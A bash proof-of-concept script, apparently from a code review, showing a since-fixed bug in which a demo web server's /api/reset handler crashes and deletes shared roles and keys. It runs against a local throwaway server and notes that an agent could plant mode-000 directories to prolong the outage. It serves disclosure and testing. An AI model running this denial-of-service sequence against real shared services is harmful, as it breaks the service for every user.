#!/usr/bin/env bash
# FIXED before merge, found in review of the web-ui branch (web/server.py: drain, rmtree, capped).
# PoC: /api/reset permanently bricks the single shared demo world.
#
# web/server.py:106-110  rmtree()'s onexc handler `fix` calls `func(p)` but in
# CPython's fd-based shutil.rmtree, `func` can be os.open (needs a flags arg) ->
# TypeError. overlayfs always leaves state/runs/<id>/work/work mode 000, so the
# first jail run plants a dir that rmtree cannot delete. The next world rebuild
# (reset, or create() on a half-built world) deletes world/roles + world/keys
# first, then crashes on work/work -> the shared world is left unusable for
# EVERY user, and every retry re-crashes. The normal demo flow (run, then
# "Reset the demo world") triggers it.
#
# fix() chmods the bad dir to 0700 *before* it crashes, so the world self-heals
# after N+1 resets, N = number of mode-000 dirs in the tree. The agent controls
# N (plant hundreds of `chmod 000` dirs in the workspace -> recovery stalls);
# every failed reset meanwhile deletes roles/keys, breaking the shared world
# for ALL users.
#
# Usage: web-reset-brick.sh <escrow-web-bin> <python3-bin>
set -euo pipefail
WEB=${1:?escrow-web bin}; PY=${2:?python3 bin}
D=$(mktemp -d); trap '[ -n "${SRV-}" ] && kill "$SRV" 2>/dev/null; rm -rf "$D" 2>/dev/null || { chmod -R u+rwx "$D" 2>/dev/null; rm -rf "$D"; }' EXIT
"$PY" -I - "$D/data" "$WEB" <<'PYE'
import sys, secrets, importlib.util, subprocess, pathlib
src=subprocess.check_output(["sed","-n","s|.* \\(/nix/store/[^ ]*/server.py\\).*|\\1|p",sys.argv[2]]).decode().strip()
sp=importlib.util.spec_from_file_location("srv",src); m=importlib.util.module_from_spec(sp); sp.loader.exec_module(m)
d=pathlib.Path(sys.argv[1]); d.mkdir(parents=True,exist_ok=True); s=secrets.token_bytes(16)
(d/"users").write_text(f"t {s.hex()} {m.scrypt('poc-password-123',s).hex()}\n")
PYE
"$WEB" serve --data "$D/data" --listen 127.0.0.1:18132 >"$D/log" 2>&1 & SRV=$!
sleep 2; U=http://127.0.0.1:18132
curl -s -c "$D/cj" -H 'X-Escrow: 1' -H 'Content-Type: application/json' \
  --data-binary '{"user":"t","password":"poc-password-123"}' $U/api/login >/dev/null
echo "1) one jail run (leaves overlay work/work mode 000):"
curl -s -b "$D/cj" -H 'X-Escrow: 1' -H 'Content-Type: application/json' \
  --data-binary '{"persona":"alice","mode":"command","text":"echo hi"}' $U/api/run \
  | "$PY" -I -c 'import sys,json;print("   run ok =",json.load(sys.stdin)["ok"])'
echo "2) reset (the normal demo button):"
R=$(curl -s -o /dev/null -w '%{http_code}' -b "$D/cj" -H 'X-Escrow: 1' -H 'Content-Type: application/json' --data-binary '{}' $U/api/reset || echo '000(conn reset=crash)')
echo "   HTTP $R (empty/500 = handler crashed)"
echo "3) world/roles + world/keys now gone:"
ls "$D/data/world" 2>/dev/null | sed 's/^/   /'
echo "4) every action now fails for everyone:"
curl -s -b "$D/cj" -H 'X-Escrow: 1' -H 'Content-Type: application/json' \
  --data-binary '{"persona":"alice","mode":"ticket","text":""}' $U/api/run \
  | "$PY" -I -c 'import sys,json;d=json.load(sys.stdin);print("   ",d["stderr"].strip())'
echo "5) reset recovers only after N+1 tries (N = mode-000 dirs, agent-controlled):"
R=$(curl -s -o /dev/null -w '%{http_code}' -b "$D/cj" -H 'X-Escrow: 1' -H 'Content-Type: application/json' --data-binary '{}' $U/api/reset || echo '000(conn reset=crash)')
echo "   HTTP $R"
echo "   traceback from server log:"; grep -A1 'line 110, in fix' "$D/log" | tail -2 | sed 's/^/   /'
